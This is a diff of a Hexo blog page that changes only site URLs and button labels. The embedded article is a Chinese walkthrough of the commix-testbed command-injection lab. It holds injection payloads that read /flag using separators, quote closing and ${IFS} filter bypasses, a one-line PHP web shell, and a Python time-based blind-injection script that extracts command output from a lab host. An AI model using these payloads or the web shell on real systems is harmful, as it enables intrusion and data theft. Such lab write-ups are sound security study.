@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\nClassic regular example没有过滤 直接分割一下，读flag 注意一下编码\npaylaod\n1;cat%20/flag %0acat%20/flag\n\nClassic (Base64) regular example输入之前的payload  提示\nPlease, encode your input to Base64 format.                \nbase64编码一下\n1;cat /flag  ==&gt; O2NhdCAvZmxhZw==\n\n拿到flag\nClassic (Hex) regular example16进制编码一下\n1;cat /flag  ==&gt;  0x3b636174202f666c6167\n\n去掉前面的0x，提交  \nClassic single-quote example直接用之前的payload 没显示，提交127.0.0.1 有回显\n看一下源码(关键部分)\n1echo exec(\"/bin/ping -c4 '\".$addr.\"'\");\n\n参数被单引号包住，闭合一下 \n1%27;cat%20/flag%27\n\nClassic double-quote example和前面不同的就是被双引号包住，闭合一下\n%22;cat%20/flag%22\nClassic non-space example过滤了空格 %0a等字符，利用${IFS}绕过\n1;cat$&#123;IFS&#125;/flag\n\nClassic blacklisting example做的这题的时候，网突然卡了，我还以为碰到了个大WAF，害的我跑去看源码，\n123456$blacklisting = array(  ';' =&gt; '',  '&amp;&amp;'=&gt; '',  '|' =&gt; '',  '`' =&gt; '' );\n\n黑名单，过滤了四个字符，没关系，分割符可以用%0a 等换行符表示\npaylaod\n1%0acat%20/flag\n\nClassic hashing example给了一串hash  ，去解密一下，一般是解密不出来的\n果然，没有破解出来  看一下前面的英语，string to hash 翻译一下 \n原来是把输入的字符串转为hash 输入一个试试 \n11 ==&gt; b026324c6904b2a9cb4b88d6d61c81d1\n\n有salt  命令注入还是头一次碰到这种情况，看一下源码\n1echo exec('echo '.$string.' | md5sum');\n\nmd5sum是Linux一个hash命令\n因为md5sum在exec的后面，可以利用换行符绕过\npayload \n1`cat%20/flag`%0a\n\nClassic example &amp; Basic HTTP Authentication弹出一个对话框，auth认证，输入一个弱密码 admin admin试试，竟然绕过了\n这里竟然啥都没过滤，直接截断，读文件\n1;cat+/flag\n\nBlind regular example盲注型的注入\ndnslog12\n\n延时注入需要几个命令 sed cut\nsed123456root@kali:~# ls | sed 1p1.txt1.txt22.pyroot@kali:~# ls | sed -n 1p1.txt\n\ncut123456root@kali:~# whoamirootroot@kali:~# whoami | cut -c 1rroot@kali:~# whoami|cut -c 1-2ro\n\n连起来用\n12root@kali:~# ls | sed -n 1p | cut -c 1-21.\n\ntime rcetest.php写入\n123&lt;?phpsystem($_GET[shell]);?&gt;\n\npayload\n1test.php?shell=if [ $(whoami|cut -c 1) = w ];then sleep 10;fi\n\n当猜对的时候 延时10s 猜错了 直接返回\n读文件可能有特殊字符，base32编码一下\n12&gt;&gt;&gt; base64.b32encode(b&apos;w&apos;)b&apos;O4======&apos;\n\npayload\n1test.php?shell=if [ $(whoami|base32|cut -c 1) = O ];then sleep 10;fi\n\nwc命令统计字节数\n1234p1k@ddd:/var/www/html$ whoami | wc      1       1       4p1k@ddd:/var/www/html$ whoami | wc -c4\n\n脚本\n123456789101112131415161718192021222324252627282930313233import base64import requestschars= &quot;QWERTYUIIOPASDFGHJKLZXCVBNM1234567890=&quot;def get_length(url,cmd,time):    data_length=&apos;&apos;    for i in range(1,10):        for k in range(0,10):            url1 = url + &apos;if [ $(&#123;0&#125;|base32|wc -c|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,i,k)            print(url1)            try:                res=requests.get(url=url1,timeout=time)            except:                print(k)                data_length += str(k)                break    return data_lengthdef get_content(url,cmd,time,length):    result=&apos;&apos;    for k in range(length):        for c in chars:            url1 = url + &apos;if [ $(&#123;0&#125;|base32|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,k,c)            try:                requests.get(url=url1,timeout=time)            except:                result += c                print(result)                break    return resultlength=int(get_length(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2))result=get_content(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2,length)print(base64.b32decode((result)))\n\n","dateCreated":"2019-09-19T15:51:10+08:00","dateModified":"2019-10-30T16:55:25+08:00","datePublished":"2019-09-19T15:51:10+08:00","description":"","headline":"commix-testbed","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/19/commix-testbed/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/19/commix-testbed/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\nClassic regular example没有过滤 直接分割一下，读flag 注意一下编码\npaylaod\n1;cat%20/flag %0acat%20/flag\n\nClassic (Base64) regular example输入之前的payload  提示\nPlease, encode your input to Base64 format.                \nbase64编码一下\n1;cat /flag  ==&gt; O2NhdCAvZmxhZw==\n\n拿到flag\nClassic (Hex) regular example16进制编码一下\n1;cat /flag  ==&gt;  0x3b636174202f666c6167\n\n去掉前面的0x，提交  \nClassic single-quote example直接用之前的payload 没显示，提交127.0.0.1 有回显\n看一下源码(关键部分)\n1echo exec(\"/bin/ping -c4 '\".$addr.\"'\");\n\n参数被单引号包住，闭合一下 \n1%27;cat%20/flag%27\n\nClassic double-quote example和前面不同的就是被双引号包住，闭合一下\n%22;cat%20/flag%22\nClassic non-space example过滤了空格 %0a等字符，利用${IFS}绕过\n1;cat$&#123;IFS&#125;/flag\n\nClassic blacklisting example做的这题的时候，网突然卡了，我还以为碰到了个大WAF，害的我跑去看源码，\n123456$blacklisting = array(  ';' =&gt; '',  '&amp;&amp;'=&gt; '',  '|' =&gt; '',  '`' =&gt; '' );\n\n黑名单，过滤了四个字符，没关系，分割符可以用%0a 等换行符表示\npaylaod\n1%0acat%20/flag\n\nClassic hashing example给了一串hash  ，去解密一下，一般是解密不出来的\n果然，没有破解出来  看一下前面的英语，string to hash 翻译一下 \n原来是把输入的字符串转为hash 输入一个试试 \n11 ==&gt; b026324c6904b2a9cb4b88d6d61c81d1\n\n有salt  命令注入还是头一次碰到这种情况，看一下源码\n1echo exec('echo '.$string.' | md5sum');\n\nmd5sum是Linux一个hash命令\n因为md5sum在exec的后面，可以利用换行符绕过\npayload \n1`cat%20/flag`%0a\n\nClassic example &amp; Basic HTTP Authentication弹出一个对话框，auth认证，输入一个弱密码 admin admin试试，竟然绕过了\n这里竟然啥都没过滤，直接截断，读文件\n1;cat+/flag\n\nBlind regular example盲注型的注入\ndnslog12\n\n延时注入需要几个命令 sed cut\nsed123456root@kali:~# ls | sed 1p1.txt1.txt22.pyroot@kali:~# ls | sed -n 1p1.txt\n\ncut123456root@kali:~# whoamirootroot@kali:~# whoami | cut -c 1rroot@kali:~# whoami|cut -c 1-2ro\n\n连起来用\n12root@kali:~# ls | sed -n 1p | cut -c 1-21.\n\ntime rcetest.php写入\n123&lt;?phpsystem($_GET[shell]);?&gt;\n\npayload\n1test.php?shell=if [ $(whoami|cut -c 1) = w ];then sleep 10;fi\n\n当猜对的时候 延时10s 猜错了 直接返回\n读文件可能有特殊字符，base32编码一下\n12&gt;&gt;&gt; base64.b32encode(b&apos;w&apos;)b&apos;O4======&apos;\n\npayload\n1test.php?shell=if [ $(whoami|base32|cut -c 1) = O ];then sleep 10;fi\n\nwc命令统计字节数\n1234p1k@ddd:/var/www/html$ whoami | wc      1       1       4p1k@ddd:/var/www/html$ whoami | wc -c4\n\n脚本\n123456789101112131415161718192021222324252627282930313233import base64import requestschars= &quot;QWERTYUIIOPASDFGHJKLZXCVBNM1234567890=&quot;def get_length(url,cmd,time):    data_length=&apos;&apos;    for i in range(1,10):        for k in range(0,10):            url1 = url + &apos;if [ $(&#123;0&#125;|base32|wc -c|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,i,k)            print(url1)            try:                res=requests.get(url=url1,timeout=time)            except:                print(k)                data_length += str(k)                break    return data_lengthdef get_content(url,cmd,time,length):    result=&apos;&apos;    for k in range(length):        for c in chars:            url1 = url + &apos;if [ $(&#123;0&#125;|base32|cut -c &#123;1&#125;) = &#123;2&#125; ];then sleep 3;fi&apos;.format(cmd,k,c)            try:                requests.get(url=url1,timeout=time)            except:                result += c                print(result)                break    return resultlength=int(get_length(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2))result=get_content(&apos;http://192.168.25.129/test.php?shell=&apos;,&apos;whoami&apos;,2,length)print(base64.b32decode((result)))\n\n","dateCreated":"2019-09-19T15:51:10+08:00","dateModified":"2019-10-30T16:55:25+08:00","datePublished":"2019-09-19T15:51:10+08:00","description":"","headline":"commix-testbed","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/19/commix-testbed/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/19/commix-testbed/"}</script>
     <meta name="description" content="Classic regular example没有过滤 直接分割一下，读flag 注意一下编码 paylaod 1;cat%20/flag %0acat%20/flag  Classic (Base64) regular example输入之前的payload  提示 Please, encode your input to Base64 format.                 bas">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="commix-testbed">
-<meta property="og:url" content="http://yoursite.com/2019/09/19/commix-testbed/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/09/19/commix-testbed/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Classic regular example没有过滤 直接分割一下，读flag 注意一下编码 paylaod 1;cat%20/flag %0acat%20/flag  Classic (Base64) regular example输入之前的payload  提示 Please, encode your input to Base64 format.                 bas">
 <meta property="og:locale" content="zh-cn">
@@ -332,7 +332,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -343,7 +343,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/19/commix-testbed/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/19/commix-testbed/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -356,7 +356,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/19/commix-testbed/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/19/commix-testbed/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -369,7 +369,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/19/commix-testbed/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/19/commix-testbed/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -382,7 +382,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -447,7 +447,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -458,7 +458,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/19/commix-testbed/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/19/commix-testbed/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -471,7 +471,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/19/commix-testbed/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/19/commix-testbed/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -484,7 +484,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/19/commix-testbed/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/19/commix-testbed/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -497,7 +497,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -518,7 +518,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/19/commix-testbed/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/19/commix-testbed/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -531,7 +531,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/19/commix-testbed/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/19/commix-testbed/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -544,7 +544,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/19/commix-testbed/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/19/commix-testbed/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
